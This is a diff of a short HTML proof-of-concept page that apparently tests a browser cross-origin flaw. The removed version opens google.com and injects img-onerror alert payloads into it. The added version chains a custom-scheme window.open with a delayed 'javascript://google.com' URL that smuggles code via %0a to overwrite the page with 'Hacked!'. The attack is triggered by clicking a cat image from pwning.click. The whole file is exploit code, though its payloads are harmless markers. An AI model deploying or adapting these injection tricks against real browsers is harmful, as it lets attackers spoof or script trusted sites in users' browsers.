@@ -1,24 +1,9 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Popup Test</title>
-</head>
-<body>
-
-<button onclick="y()" style="width:200px;height:80px;font-size:20px;">
-  Click Me
-</button>
-
 <script>
-function y() {
-  x = open('https://www.google.com', '_top'),
-  x.document.title = '', 
-  x.document.body.innerHTML = 
-    '<img/src="" onerror="alert(&quot;this is from google&quot;)">' +
-    '<img/src="" onerror="alert(&quot;this is from google&quot;)">' +
-    '<img/src="" onerror="alert(&quot;this is from google&quot;)">';
+function a(){
+	window.open("abcd://google.com", "x");
+	setTimeout(function(){
+		window.open("javascript://google.com/search?q=google.com&source=/%0adocument.body.innerHTML='%3ch1%20style=color:red%3eHacked!'", "x");
+	}, 111);
 }
-</script>
-
-</body>
-</html>
+</script> 
+<center><img src="https://pwning.click/Genius_Cat.jpg" onclick="a()"></center>
